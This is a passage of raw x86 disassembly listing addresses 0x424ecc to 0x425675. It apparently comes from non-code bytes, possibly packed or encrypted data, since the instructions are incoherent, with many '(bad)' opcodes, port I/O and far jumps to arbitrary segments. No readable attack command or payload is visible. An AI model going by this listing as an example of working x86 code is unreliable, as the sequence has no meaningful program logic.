  424ecc:	and    DWORD PTR [edx+0x2daee078],edx
  424ed2:	push   es
  424ed3:	mov    ah,0xc5
  424ed5:	push   es
  424ed6:	add    bh,BYTE PTR [edi+0x2e2bf3cc]
  424edc:	das    
  424edd:	fldenv [eax+eax*1]
  424ee0:	jmp    0x74f4:0x2bc03894
  424ee7:	retf   
  424ee8:	maskmovq mm1,(bad)
  424ee9:	test   DWORD PTR [edx],0x82201cb
  424eef:	sti    
  424ef0:	repz jnp 0x424eac
  424ef3:	pop    edx
  424ef4:	aad    0x7f
  424ef6:	sub    ah,BYTE PTR [esi+0x5d420f12]
  424efc:	std    
  424efd:	mov    eax,ds:0x7ec3c718
  424f02:	out    0xcf,al
  424f04:	je     0x424ef3
  424f06:	and    al,0x82
  424f08:	rcr    DWORD PTR [esp],cl
  424f0b:	add    al,0x83
  424f0d:	xor    ebx,ebx
  424f0f:	add    ah,ch
  424f11:	stc    
  424f12:	aad    0xed
  424f14:	ss jle 0x424eb5
  424f17:	es pop eax
  424f19:	jl     0x424f64
  424f1b:	icebp  
  424f1c:	adc    al,0x22
  424f1e:	or     BYTE PTR [ecx+edx*4-0x14e476c0],cl
  424f25:	pop    es
  424f26:	int    0xa3
  424f28:	cmp    DWORD PTR [ebx-0x25],esp
  424f2b:	inc    edx
  424f2c:	dec    esi
  424f2d:	in     al,dx
  424f2e:	les    edi,FWORD PTR [ebp+0x5eeeaa2a]
  424f34:	cmc    
  424f35:	ins    DWORD PTR es:[edi],dx
  424f36:	sti    
  424f37:	popf   
  424f38:	ja     0x424ece
  424f3a:	adc    al,BYTE PTR [ebx+0x41]
  424f3d:	inc    edi
  424f3e:	pop    edx
  424f3f:	mov    ch,0x42
  424f41:	inc    eax
  424f42:	add    eax,DWORD PTR [ecx-0x54]
  424f45:	dec    ecx
  424f46:	jl     0x424f00
  424f48:	dec    eax
  424f49:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f4b:	inc    esi
  424f4c:	pop    esi
  424f4d:	pop    es
  424f4e:	mov    al,0xe3
  424f50:	outs   dx,BYTE PTR ds:[esi]
  424f51:	or     eax,0x1c9705fb
  424f56:	and    DWORD PTR [edx],edx
  424f58:	dec    ebp
  424f59:	ss in  eax,0x19
  424f5c:	(bad)  
  424f5d:	out    0x10,eax
  424f5f:	fadd   QWORD PTR [eax-0x48]
  424f62:	das    
  424f63:	jne    0x424faf
  424f65:	jne    0x424f1a
  424f67:	scas   al,BYTE PTR es:[edi]
  424f68:	adc    eax,ecx
  424f6a:	jmp    0x59db4a1
  424f6f:	sub    BYTE PTR [ebx+esi*4-0x7e],al
  424f73:	pop    ds
  424f74:	jp     0x424ef9
  424f76:	in     al,0x8b
  424f78:	rol    DWORD PTR [eax],0xcb
  424f7b:	jnp    0x424fcd
  424f7d:	cmp    dl,BYTE PTR [edi]
  424f7f:	fdivr  st(1),st
  424f81:	pop    edi
  424f82:	and    eax,0xfe796bd0
  424f87:	in     al,dx
  424f88:	in     al,0xc8
  424f8a:	movups xmm5,xmm6
  424f8d:	nop
  424f8e:	aam    0xc7
  424f90:	jnp    0x424f80
  424f92:	xchg   DWORD PTR [edi+0x47],ebx
  424f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f96:	lahf   
  424f97:	inc    eax
  424f98:	in     eax,0xd8
  424f9a:	add    BYTE PTR [eax-0xdc4f12c],bh
  424fa0:	loope  0x424fe5
  424fa2:	or     dh,BYTE PTR [eax]
  424fa4:	dec    eax
  424fa5:	icebp  
  424fa6:	add    DWORD PTR [eax],0xc9df9a8d
  424fac:	xor    al,0xe1
  424fae:	pop    edx
  424faf:	add    dl,BYTE PTR [ebx]
  424fb1:	fbld   TBYTE PTR [ebp+eax*1+0x79294386]
  424fb8:	xchg   ebx,eax
  424fb9:	push   edi
  424fba:	fild   DWORD PTR [edx+0x2dd425fe]
  424fc0:	add    al,0xc5
  424fc2:	push   es
  424fc3:	push   edi
  424fc4:	outs   dx,DWORD PTR ds:[esi]
  424fc5:	sub    ah,al
  424fc7:	cdq    
  424fc8:	cld    
  424fc9:	in     eax,0x17
  424fcb:	push   ds
  424fcc:	pop    edi
  424fcd:	and    ebx,DWORD PTR [ecx+0x16]
  424fd0:	lock mov esp,esi
  424fd3:	mov    esp,0x24c61c57
  424fd8:	dec    ebp
  424fd9:	cmp    BYTE PTR [edx+0x26],0x98
  424fdd:	pop    esi
  424fde:	aaa    
  424fdf:	lea    esi,[edi+0x4b]
  424fe2:	or     eax,0x5f7f4caa
  424fe7:	mov    BYTE PTR [ebx-0x17],dl
  424fea:	add    dl,cl
  424fec:	rcl    ebp,cl
  424fee:	sub    esp,ebp
  424ff0:	rol    eax,cl
  424ff2:	lahf   
  424ff3:	pop    ss
  424ff4:	call   FWORD PTR [ebx-0x166748d7]
  424ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ffb:	jnp    0x424ffc
  424ffd:	add    DWORD PTR [edi*2-0x43e4b24b],edx
  425004:	or     al,0x8
  425006:	fs data16 das 
  425009:	fcmove st,st(7)
  42500b:	sbb    DWORD PTR [eax],eax
  42500d:	sar    al,0x53
  425010:	pop    ss
  425011:	jno    0x424faf
  425013:	mov    bh,0x86
  425015:	xchg   edx,eax
  425016:	arpl   dx,bx
  425018:	in     al,0x83
  42501a:	and    BYTE PTR [ebp-0x555b4699],dh
  425020:	mov    bh,0x59
  425022:	cmp    bh,BYTE PTR [edi-0x44]
  425025:	lods   eax,DWORD PTR ds:[esi]
  425026:	add    ch,0x58
  425029:	(bad)  
  42502b:	outs   dx,DWORD PTR ds:[esi]
  42502c:	sbb    dl,BYTE PTR [ecx]
  42502e:	sub    cl,0x6c
  425031:	xor    edx,DWORD PTR [eax]
  425033:	ret    0x3f27
  425036:	loopne 0x424fd0
  425038:	lods   eax,DWORD PTR ds:[esi]
  425039:	sbb    edi,0x36
  42503c:	mov    dh,0x29
  42503e:	fild   DWORD PTR [esi]
  425040:	leave  
  425041:	mov    dh,0x90
  425043:	mov    WORD PTR [edi],ds
  425045:	fidiv  DWORD PTR [edi+0x61]
  425048:	jne    0x4250b6
  42504a:	push   es
  42504b:	in     eax,0x7a
  42504d:	enter  0x7d32,0xce
  425051:	lods   eax,DWORD PTR ds:[esi]
  425052:	das    
  425053:	or     al,al
  425055:	cli    
  425056:	pop    ecx
  425057:	inc    esi
  425058:	cdq    
  425059:	mov    ebp,0x7d46ff8
  42505e:	jbe    0x4250c8
  425060:	out    dx,eax
  425061:	ins    BYTE PTR es:[edi],dx
  425062:	les    edi,FWORD PTR [esi+0x57be5edf]
  425068:	xchg   ebp,eax
  425069:	and    al,0xa9
  42506b:	push   esi
  42506c:	sbb    al,0xde
  42506e:	cmp    eax,0xd040a0ed
  425073:	dec    esi
  425074:	jmp    0xd97d:0xc1e81456
  42507b:	mov    dl,0x3e
  42507d:	cmp    al,0xaf
  42507f:	adc    bl,bl
  425081:	ja     0x425014
  425083:	sub    dl,0xef
  425086:	sub    DWORD PTR [ebx+0x595c0492],ecx
  42508c:	int3   
  42508d:	ror    BYTE PTR [ecx],0x1a
  425090:	adc    BYTE PTR [edi],dl
  425092:	mov    esp,0x8a66fafd
  425097:	dec    esi
  425098:	cmp    al,0xcc
  42509a:	or     al,0x8
  42509c:	and    bh,BYTE PTR ds:0xcd0b3531
  4250a2:	inc    ebp
  4250a3:	ins    DWORD PTR es:[edi],dx
  4250a4:	push   ecx
  4250a5:	push   edx
  4250a6:	popa   
  4250a7:	jbe    0x42509d
  4250a9:	dec    ecx
  4250aa:	jecxz  0x42512a
  4250ac:	in     eax,dx
  4250ad:	dec    esi
  4250ae:	mov    WORD PTR [esi],?
  4250b0:	xchg   BYTE PTR [esp+edx*4+0x11],bl
  4250b4:	fist   DWORD PTR ds:0xdcdac43
  4250ba:	daa    
  4250bb:	pop    esp
  4250bc:	adc    BYTE PTR [esi],al
  4250be:	ins    DWORD PTR es:[edi],dx
  4250bf:	mov    bl,0x2e
  4250c1:	in     al,dx
  4250c2:	add    dh,0xf
  4250c5:	xchg   edi,eax
  4250c6:	cmp    BYTE PTR [eax-0x29dd4de9],ah
  4250cc:	in     eax,0x77
  4250ce:	fcomip st,st(4)
  4250d0:	push   ebp
  4250d1:	icebp  
  4250d2:	and    al,0x8a
  4250d4:	cdq    
  4250d5:	and    al,BYTE PTR [edx+0x413f5100]
  4250db:	pop    edx
  4250dc:	sbb    BYTE PTR [edi-0x3aeb7ec4],bl
  4250e2:	inc    edx
  4250e3:	es dec ecx
  4250e5:	and    al,al
  4250e7:	push   cs
  4250e8:	add    edi,DWORD PTR [eax]
  4250ea:	gs xchg esp,eax
  4250ec:	sbb    DWORD PTR [ebp+0x694f5879],ebx
  4250f2:	adc    ebp,DWORD PTR [edx]
  4250f4:	scas   eax,DWORD PTR es:[edi]
  4250f5:	or     BYTE PTR [edx+0x2373acb4],0xeb
  4250fc:	sahf   
  4250fd:	mov    dl,0x98
  4250ff:	ret    0x38a5
  425102:	xor    ch,cl
  425104:	dec    ebp
  425105:	and    edx,DWORD PTR [edx+esi*2+0xb59b954]
  42510c:	imul   ecx,DWORD PTR [esp+eax*8],0xe1cea71b
  425113:	outs   dx,DWORD PTR ss:[esi]
  425115:	ret    0xc24c
  425118:	add    eax,0x92fcd4eb
  42511d:	shl    DWORD PTR [ecx+0x6c],0x57
  425121:	sar    BYTE PTR [ebx],1
  425123:	retf   0x9890
  425126:	adc    BYTE PTR [edx+0x35e62557],dh
  42512c:	push   esi
  42512d:	cdq    
  42512e:	fidivr DWORD PTR [esi-0x47a8ba59]
  425134:	mov    ?,WORD PTR cs:[edi-0x5]
  425138:	xchg   edi,eax
  425139:	iret   
  42513a:	xor    cl,BYTE PTR [edx+0x3a]
  42513d:	je     0x4251b5
  42513f:	ins    BYTE PTR es:[edi],dx
  425140:	cmp    DWORD PTR [ecx+edx*4+0x1d6fb1e5],ecx
  425147:	fmul   QWORD PTR [ecx+0x32]
  42514a:	bound  ecx,QWORD PTR [ebp+ecx*1-0x28]
  42514e:	in     al,dx
  42514f:	push   ebp
  425150:	xchg   esi,eax
  425151:	fdiv   st,st(2)
  425153:	popa   
  425154:	inc    eax
  425155:	and    DWORD PTR [esi+0x67e254a8],edi
  42515b:	ins    BYTE PTR es:[edi],dx
  42515c:	mov    bh,0xe4
  42515e:	or     eax,0xb4090ae2
  425163:	push   cs
  425164:	pop    eax
  425165:	sti    
  425166:	mov    esi,0x2a3ceeef
  42516b:	out    dx,eax
  42516c:	add    eax,0x840c0d43
  425171:	aam    0x24
  425173:	into   
  425174:	lds    eax,FWORD PTR [esi]
  425176:	jns    0x4251f1
  425178:	sub    eax,ebp
  42517a:	add    al,BYTE PTR [esi-0x14]
  42517d:	and    dl,BYTE PTR [edi]
  42517f:	retf   
  425180:	dec    edi
  425181:	jl     0x4251ad
  425183:	in     al,dx
  425184:	xor    ah,BYTE PTR [edx+0xe69ff19]
  42518a:	jl     0x425180
  42518c:	adc    DWORD PTR [edx],esi
  42518e:	push   es
  42518f:	pop    es
  425190:	jmp    0x74e4883f
  425195:	xor    ebp,DWORD PTR [ecx]
  425197:	xchg   esi,eax
  425198:	inc    esi
  425199:	pop    es
  42519a:	jnp    0x4251c9
  42519c:	nop
  42519d:	sbb    cl,BYTE PTR [ecx]
  42519f:	xor    eax,0xd1f904f9
  4251a4:	mov    eax,ds:0xf219d237
  4251a9:	fsub   QWORD PTR [ebx+0x20]
  4251ac:	scas   al,BYTE PTR es:[edi]
  4251ad:	mov    edx,0x4eec9059
  4251b2:	adc    DWORD PTR [esi+0x71],ebp
  4251b5:	inc    esp
  4251b6:	or     al,0x52
  4251b8:	push   ebx
  4251b9:	jae    0x42519b
  4251bb:	jbe    0x42521e
  4251bd:	inc    ebp
  4251be:	pop    es
  4251bf:	rcr    BYTE PTR [eax+eiz*8-0x3],0xe2
  4251c4:	dec    edi
  4251c5:	add    eax,0x3160e72d
  4251ca:	ficomp DWORD PTR [esi]
  4251cc:	cmp    al,0x43
  4251ce:	push   esp
  4251cf:	inc    esi
  4251d0:	shr    DWORD PTR [ecx+edi*4+0x4d61a758],1
  4251d7:	in     eax,dx
  4251d8:	loopne 0x425182
  4251da:	push   ss
  4251db:	bound  edx,QWORD PTR [edx+0x2]
  4251de:	inc    ebx
  4251df:	push   ebp
  4251e0:	sar    BYTE PTR [ebx-0x3d],0x83
  4251e4:	inc    eax
  4251e5:	push   0x3c822d65
  4251ea:	mov    bh,0xbc
  4251ec:	ss mov eax,0x2f600d18
  4251f2:	jl     0x425256
  4251f4:	dec    edx
  4251f5:	dec    esi
  4251f6:	sub    al,0xe6
  4251f8:	adc    esp,esp
  4251fa:	mov    ebp,0x265b33a6
  4251ff:	fbstp  TBYTE PTR [eax+esi*4+0x50b94b7c]
  425206:	mov    ecx,DWORD PTR [esi-0x25]
  425209:	sbb    BYTE PTR ds:0x8b64ed9e,ah
  42520f:	js     0x42523e
  425211:	sbb    al,0xd1
  425213:	mul    esi
  425215:	sub    DWORD PTR [eax+edx*8],0x57
  425219:	inc    eax
  42521a:	fdiv   st,st(5)
  42521c:	adc    bl,bl
  42521e:	fadd   DWORD PTR es:[edx+0x29a15248]
  425225:	mov    ds:0xc591d12c,al
  42522a:	ja     0x425206
  42522c:	inc    edx
  42522d:	loop   0x42520d
  42522f:	outs   dx,BYTE PTR ds:[si]
  425231:	bts    esp,ecx
  425234:	mov    al,0x22
  425236:	fs enter 0xa574,0xa5
  42523b:	stos   DWORD PTR es:[edi],eax
  42523c:	adc    eax,0xb68da138
  425241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425242:	add    dh,BYTE PTR [eax]
  425244:	mov    esp,gs
  425246:	jl     0x4251e0
  425248:	inc    edx
  425249:	pop    es
  42524a:	iret   
  42524b:	leave  
  42524c:	pop    ecx
  42524d:	mov    eax,ds:0x17c84d94
  425252:	pop    edi
  425253:	xor    bl,bh
  425255:	call   0xc615dd13
  42525a:	xchg   esi,eax
  42525b:	xchg   esi,eax
  42525c:	inc    ecx
  42525d:	cwde   
  42525e:	clc    
  42525f:	pop    es
  425260:	loopne 0x425254
  425262:	pop    ebx
  425263:	or     DWORD PTR [edi-0x2c],0x782f66cf
  42526a:	mov    cl,0xfc
  42526c:	cmovnp edx,DWORD PTR [eax+0x12]
  425270:	hlt    
  425271:	jae    0x425204
  425273:	push   esi
  425274:	push   ss
  425275:	rcl    BYTE PTR [eax+0x3ae2d6de],1
  42527b:	pop    ss
  42527c:	cmp    eax,0x95cb7bb6
  425281:	stos   DWORD PTR es:[edi],eax
  425282:	push   DWORD PTR [ecx+0x78aa3c6e]
  425288:	in     eax,dx
  425289:	xor    DWORD PTR [edx-0x1d],esi
  42528c:	popa   
  42528d:	cmc    
  42528e:	cmc    
  42528f:	lea    ecx,[ebx]
  425291:	add    DWORD PTR [edi+ebp*4-0x5b48ce86],esi
  425298:	je     0x425257
  42529a:	jne    0x42527d
  42529c:	test   al,0x37
  42529e:	jns    0x425293
  4252a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252a1:	xor    BYTE PTR [edx],cl
  4252a3:	repz inc edx
  4252a5:	add    cl,bl
  4252a7:	out    dx,al
  4252a8:	cmp    BYTE PTR [ebx-0x15],ah
  4252ab:	scas   eax,DWORD PTR es:[edi]
  4252ac:	or     eax,0x1f6701b4
  4252b2:	fs dec edx
  4252b4:	ins    DWORD PTR es:[edi],dx
  4252b5:	xchg   esi,eax
  4252b6:	cmp    DWORD PTR [ecx+0x3a283393],ebx
  4252bc:	dec    esi
  4252bd:	pop    edi
  4252be:	pop    ebx
  4252bf:	int3   
  4252c0:	enter  0x3855,0x2
  4252c4:	mov    dx,0x27d6
  4252c8:	adc    BYTE PTR [eax+0x6e4eafbd],bh
  4252ce:	retf   
  4252cf:	mov    eax,ds:0x1c1dd887
  4252d4:	sbb    esi,DWORD PTR [esp+eax*4-0x7c]
  4252d8:	imul   esi,DWORD PTR [edi+0x2c],0xffffff9f
  4252dc:	arpl   WORD PTR [edi-0x2b],di
  4252df:	or     DWORD PTR [esi+0x46],0xffffff87
  4252e3:	rol    ah,0xde
  4252e6:	lahf   
  4252e7:	jbe    0x4252e6
  4252e9:	inc    edx
  4252ea:	cli    
  4252eb:	mov    ch,0xba
  4252ed:	cmp    bl,BYTE PTR [ebx+0x30]
  4252f0:	add    ebp,DWORD PTR [edi]
  4252f2:	gs jle 0x42527e
  4252f5:	outs   dx,DWORD PTR ds:[esi]
  4252f6:	popa   
  4252f7:	repnz out 0x2d,eax
  4252fa:	gs out dx,al
  4252fc:	jno    0x425323
  4252fe:	jbe    0x4252d4
  425300:	retf   
  425301:	jecxz  0x425305
  425303:	and    DWORD PTR [edx],ebx
  425305:	pushf  
  425306:	and    DWORD PTR [ebx-0x45b4bc61],ebp
  42530c:	mov    ch,0xc9
  42530e:	or     BYTE PTR [ebp-0x2a],al
  425311:	push   esp
  425312:	popf   
  425313:	xor    BYTE PTR [edi],ah
  425315:	(bad)  
  425316:	fwait
  425317:	xchg   edi,eax
  425318:	jae    0x4252dd
  42531a:	js     0x4252bd
  42531c:	rol    ebp,1
  42531e:	inc    ebx
  42531f:	jbe    0x4252f0
  425321:	dec    ebx
  425322:	mov    edi,0x8ceddeaf
  425327:	call   0x2de7:0xe8cb8d4
  42532e:	xor    eax,0x6a9c4c47
  425333:	aaa    
  425334:	cld    
  425335:	mov    DWORD PTR [ecx],edi
  425337:	xor    ebp,DWORD PTR [edx-0x1e]
  42533a:	rol    DWORD PTR [edx+0x504f36e7],0x35
  425341:	icebp  
  425342:	es push edi
  425344:	xchg   DWORD PTR [edi+edx*4-0x68],edi
  425348:	and    eax,esp
  42534a:	jg     0x4252fe
  42534c:	fild   DWORD PTR [eax]
  42534e:	add    BYTE PTR [eax],al
  425350:	add    BYTE PTR [eax],al
  425352:	fwait
  425353:	push   ebp
  425354:	pusha  
  425355:	outs   dx,DWORD PTR ds:[esi]
  425356:	out    dx,al
  425357:	jg     0x4252f8
  425359:	cmc    
  42535a:	or     DWORD PTR fs:[edi+0x22],ebx
  42535e:	repnz lock cmc 
  425361:	dec    esi
  425362:	out    dx,eax
  425363:	retf   
  425364:	add    DWORD PTR [eax],eax
  425366:	repz add al,0x0
  425369:	add    BYTE PTR ds:0x398155c1,bh
  42536f:	bound  esp,QWORD PTR [edi-0x1fff93f4]
  425375:	out    0xab,al
  425377:	and    dh,ch
  425379:	xchg   BYTE PTR ds:0xf6648703,dh
  42537f:	inc    edi
  425380:	mov    ds:0x666a172d,eax
  425385:	dec    ebx
  425386:	js     0x425388
  425388:	xchg   edx,eax
  425389:	jmp    0xe0a9:0xfc76f3bf
  425390:	enter  0xe3f6,0x4a
  425394:	sbb    al,0x17
  425396:	ins    DWORD PTR es:[edi],dx
  425397:	ins    DWORD PTR es:[edi],dx
  425398:	jo     0x42533d
  42539a:	cwde   
  42539b:	imul   eax,DWORD PTR [esp+ebx*8+0x6494314e],0x143abf57
  4253a6:	mov    gs,WORD PTR [ecx]
  4253a8:	dec    ebp
  4253a9:	test   BYTE PTR [ebx+0x2b],cl
  4253ac:	jl     0x425411
  4253ae:	fst    DWORD PTR ds:0x5114229
  4253b4:	mov    cs,WORD PTR [esi]
  4253b6:	sub    eax,0x29f44a33
  4253bb:	std    
  4253bc:	xor    al,cl
  4253be:	dec    DWORD PTR [ebp+esi*8+0x67]
  4253c2:	xor    ah,BYTE PTR [esi+0x3c]
  4253c5:	aas    
  4253c6:	scas   eax,DWORD PTR es:[edi]
  4253c7:	fistp  DWORD PTR [esi-0x54f3b95c]
  4253cd:	int    0xdf
  4253cf:	repz js 0x425361
  4253d2:	fld    QWORD PTR [eax]
  4253d4:	mov    bl,0x75
  4253d6:	mov    ch,0x7e
  4253d8:	fistp  WORD PTR [edi+0x1cf9df2]
  4253de:	(bad)  
  4253df:	push   edi
  4253e0:	in     eax,dx
  4253e1:	int3   
  4253e2:	push   edx
  4253e3:	imul   bh
  4253e5:	clc    
  4253e6:	test   al,0x17
  4253e8:	dec    ecx
  4253e9:	cmp    BYTE PTR [edx+0x51533e06],0xbd
  4253f0:	adc    al,0xdf
  4253f2:	inc    edi
  4253f3:	rcr    BYTE PTR [esi],cl
  4253f5:	mov    ebx,0x8372d9fe
  4253fa:	mov    esp,0xfb8ce7e8
  4253ff:	xor    ah,BYTE PTR [esi-0x6d]
  425402:	sub    eax,0xd81db88d
  425407:	xchg   esi,eax
  425408:	rol    BYTE PTR [eax],1
  42540a:	imul   ecx,DWORD PTR [ecx+eax*2],0xffffffd5
  42540e:	lahf   
  42540f:	cmp    ch,BYTE PTR ss:[ecx-0x1d]
  425413:	loope  0x4253df
  425415:	je     0x4253bf
  425417:	or     al,0xec
  425419:	xlat   BYTE PTR ds:[ebx]
  42541a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42541b:	adc    al,BYTE PTR [edx+0x42]
  42541e:	sahf   
  42541f:	dec    eax
  425420:	test   eax,0x6a9a91bd
  425425:	popf   
  425426:	inc    esi
  425427:	mov    bh,0x6
  425429:	mov    dl,BYTE PTR [ecx-0x34]
  42542c:	cmp    BYTE PTR [ebx],dh
  42542e:	jl     0x4253f1
  425430:	mov    cl,0x95
  425432:	jb     0x42542a
  425434:	enter  0xdab4,0xc6
  425438:	(bad)  
  425439:	in     eax,0x25
  42543b:	shl    DWORD PTR [esi],cl
  42543d:	(bad)  
  42543e:	outs   dx,BYTE PTR ds:[esi]
  42543f:	inc    eax
  425440:	adc    cl,bh
  425442:	pushf  
  425443:	dec    esp
  425444:	mov    cl,0xad
  425446:	pop    ds
  425447:	lock in eax,0x9e
  42544a:	cdq    
  42544b:	sbb    eax,0xe5aa6b87
  425450:	cwde   
  425451:	sub    eax,DWORD PTR [ebx+0x7ece25c4]
  425457:	mov    ch,0x2d
  425459:	jb     0x4254ce
  42545b:	into   
  42545c:	mov    DWORD PTR [ebx+0x36514db1],ecx
  425462:	add    eax,0x4dbb80c2
  425467:	push   ebx
  425468:	inc    esi
  425469:	(bad)  
  42546a:	jmp    DWORD PTR ds:0x6cc316b8
  425470:	and    BYTE PTR [edx+0x29],dl
  425473:	jnp    0x42548a
  425475:	jb     0x425456
  425477:	retf   
  425478:	retf   0xb0d0
  42547b:	popf   
  42547c:	mov    al,ds:0xd61d189
  425481:	dec    eax
  425482:	xor    ah,BYTE PTR [esi]
  425484:	sbb    edi,DWORD PTR [edx-0x6a]
  425487:	(bad)  
  425488:	dec    esp
  425489:	mov    dh,0xb
  42548b:	outs   dx,BYTE PTR fs:[esi]
  42548d:	push   edx
  42548e:	and    bh,BYTE PTR [edx]
  425490:	ror    DWORD PTR [esi+ebp*4-0x5f],cl
  425494:	xor    dl,dh
  425496:	xchg   esi,eax
  425497:	cmp    ebp,DWORD PTR [ebx]
  425499:	push   es
  42549a:	add    eax,0x5b98eac8
  42549f:	fbstp  TBYTE PTR [ecx+eiz*1+0x4109fbac]
  4254a6:	sti    
  4254a7:	jne    0x4254dd
  4254a9:	inc    sp
  4254ab:	sbb    esi,DWORD PTR [edx]
  4254ad:	xchg   esi,eax
  4254ae:	bound  eax,QWORD PTR [ebx]
  4254b0:	mov    esp,0xf3a1f79f
  4254b5:	jmp    0x933e1437
  4254ba:	popa   
  4254bb:	repz adc DWORD PTR [esi],ebx
  4254be:	imul   eax,ebx,0xca2c432f
  4254c4:	mov    ecx,0x1417fe85
  4254c9:	mov    cl,0x24
  4254cb:	bound  edx,QWORD PTR [ebp-0x71]
  4254ce:	mov    esi,0xc0e8e7bf
  4254d3:	fst    QWORD PTR [edx+0xa]
  4254d6:	mov    cl,0x38
  4254d8:	or     eax,eax
  4254da:	mov    edx,0x9341b054
  4254df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254e0:	popf   
  4254e1:	sbb    ah,BYTE PTR [edi-0x75]
  4254e4:	push   0x13
  4254e6:	mov    al,ds:0x51a103a7
  4254eb:	loopne 0x4254b5
  4254ed:	jg     0x425491
  4254ef:	add    al,0x86
  4254f1:	inc    esp
  4254f2:	imul   ecx,DWORD PTR [edx],0x63231d0
  4254f8:	cdq    
  4254f9:	xchg   ebp,eax
  4254fa:	xchg   ebx,eax
  4254fb:	jg     0x425572
  4254fd:	out    dx,eax
  4254fe:	pop    ebp
  4254ff:	iret   
  425500:	jo     0x42556c
  425502:	mov    DWORD PTR [ebx+0x78aa2c14],ebx
  425508:	out    dx,eax
  425509:	mov    esi,0xf743ab91
  42550e:	fwait
  42550f:	mov    cl,0x6f
  425511:	adc    eax,0x375410c6
  425516:	or     DWORD PTR [ebp-0x76],ecx
  425519:	inc    eax
  42551a:	xor    BYTE PTR [ebp-0x1e],al
  42551d:	ins    BYTE PTR es:[edi],dx
  42551e:	call   0xc171a8e2
  425523:	jp     0x4254bb
  425525:	adc    ecx,DWORD PTR [ebx+0x2603c280]
  42552b:	sbb    BYTE PTR [ecx+0xe],dh
  42552e:	loope  0x4254b3
  425530:	jecxz  0x425507
  425532:	adc    bl,bh
  425534:	into   
  425535:	aaa    
  425536:	adc    eax,0x8983165c
  42553b:	imul   edi,DWORD PTR [ebx+ebx*2-0x4e],0x1e
  425540:	inc    edx
  425541:	add    ecx,DWORD PTR [edx-0x6bfca74e]
  425547:	jg     0x425542
  425549:	jg     0x4255bc
  42554b:	adc    BYTE PTR [edx+0x7e10bb34],ch
  425551:	das    
  425552:	(bad)
  425556:	out    dx,eax
  425557:	jmp    0x42552d
  425559:	imul   edi,edi,0x896503c9
  42555f:	loop   0x4255bd
  425561:	dec    BYTE PTR [edi+esi*4+0x1]
  425565:	cmc    
  425566:	sahf   
  425567:	pop    edi
  425568:	pop    es
  425569:	adc    BYTE PTR [eax-0x1465442e],ch
  42556f:	aaa    
  425570:	mov    ebx,0xa8fa3c18
  425575:	dec    esp
  425576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425577:	ds push edx
  425579:	js     0x425570
  42557b:	dec    edx
  42557c:	rcl    DWORD PTR [ecx+edx*2],cl
  42557f:	out    0xe9,al
  425581:	sub    BYTE PTR [edi+0x19d953e1],bl
  425587:	cmp    DWORD PTR [eax+esi*4],esp
  42558a:	push   ecx
  42558b:	or     eax,0xdb384680
  425590:	and    eax,0x5fea6d93
  425595:	js     0x425612
  425597:	into   
  425598:	leave  
  425599:	xor    al,BYTE PTR [ecx-0x58]
  42559c:	adc    esi,DWORD PTR [ebx-0x55]
  42559f:	xor    eax,0x9ebcca13
  4255a4:	dec    edx
  4255a5:	cli    
  4255a6:	xchg   edx,ecx
  4255a8:	fs loop 0x425532
  4255ab:	mov    dl,0xa
  4255ad:	je     0x4255ee
  4255af:	adc    bl,BYTE PTR [edx+0x622ad29a]
  4255b5:	ror    BYTE PTR [edx],1
  4255b7:	cwde   
  4255b8:	jo     0x4255de
  4255ba:	outs   dx,BYTE PTR ds:[esi]
  4255bb:	aad    0x3c
  4255bd:	lds    edx,FWORD PTR [edi+0x41]
  4255c0:	add    al,0xa4
  4255c2:	jbe    0x42555d
  4255c4:	aaa    
  4255c5:	adc    DWORD PTR [ecx],ecx
  4255c7:	jno    0x425577
  4255c9:	xlat   BYTE PTR ds:[ebx]
  4255ca:	fcomip st,st(4)
  4255cc:	mov    eax,ds:0xe9c3498e
  4255d1:	sub    bl,BYTE PTR [eax+0x72893f2c]
  4255d7:	fst    QWORD PTR [edx+0x6f40e031]
  4255dd:	dec    ebx
  4255de:	dec    edx
  4255df:	inc    ebp
  4255e0:	(bad)  [ecx]
  4255e3:	int3   
  4255e4:	dec    ebp
  4255e5:	xor    ecx,esp
  4255e7:	cmp    al,BYTE PTR [ecx+0x54]
  4255ea:	(bad)  
  4255eb:	gs in  al,0xff
  4255ee:	imul   esp,ecx,0x9d5fb14b
  4255f4:	ss cmp al,0x75
  4255f7:	hlt    
  4255f8:	out    0x10,al
  4255fa:	cs or  eax,0x1bbb3cc7
  425600:	clc    
  425601:	shl    DWORD PTR [ecx],0xab
  425604:	add    BYTE PTR [eax+eax*1],0x2b
  425608:	xchg   esi,eax
  425609:	retf   0x429b
  42560c:	inc    ebp
  42560d:	test   esp,ebp
  42560f:	pop    es
  425610:	sub    dh,dl
  425612:	fwait
  425613:	mov    ds:0xec5f4218,eax
  425618:	inc    edi
  425619:	mov    ?,WORD PTR [ebp-0x113eda92]
  42561f:	jmp    0x8952fa42
  425624:	mov    eax,0xc31ef3e8
  425629:	xchg   esp,eax
  42562a:	mov    al,0x1d
  42562c:	les    eax,FWORD PTR [ebp+ebx*8+0x7c]
  425630:	sub    al,0x21
  425632:	push   esi
  425633:	add    BYTE PTR [ebp-0x4d],al
  425636:	mov    edi,0xdf69cd97
  42563b:	fwait
  42563c:	inc    ebp
  42563d:	pop    ecx
  42563e:	loopne 0x4255c1
  425640:	pop    ds
  425641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425642:	cmp    al,0x36
  425644:	xchg   ebp,eax
  425645:	inc    edi
  425646:	push   ecx
  425647:	dec    eax
  425648:	mov    edx,0xa75717f1
  42564d:	je     0x42563e
  42564f:	sub    ecx,DWORD PTR [ecx+0xa33b184]
  425655:	(bad)
  425659:	fs pop edx
  42565b:	outs   dx,DWORD PTR ds:[esi]
  42565c:	mov    dh,0xfc
  42565e:	sti    
  42565f:	out    dx,al
  425660:	sbb    dh,cl
  425662:	cmp    esi,0x6f
  425665:	out    0xdc,eax
  425667:	push   ebx
  425668:	(bad)  
  425669:	or     eax,0xb79b0fd6
  42566e:	stc    
  42566f:	cmc    
  425670:	xchg   esp,eax
  425671:	cmp    esi,DWORD PTR [esi+edi*8+0x64]
  425675:	imul   esi,DWORD PTR ds:0xf0669c73,0x2a7601de
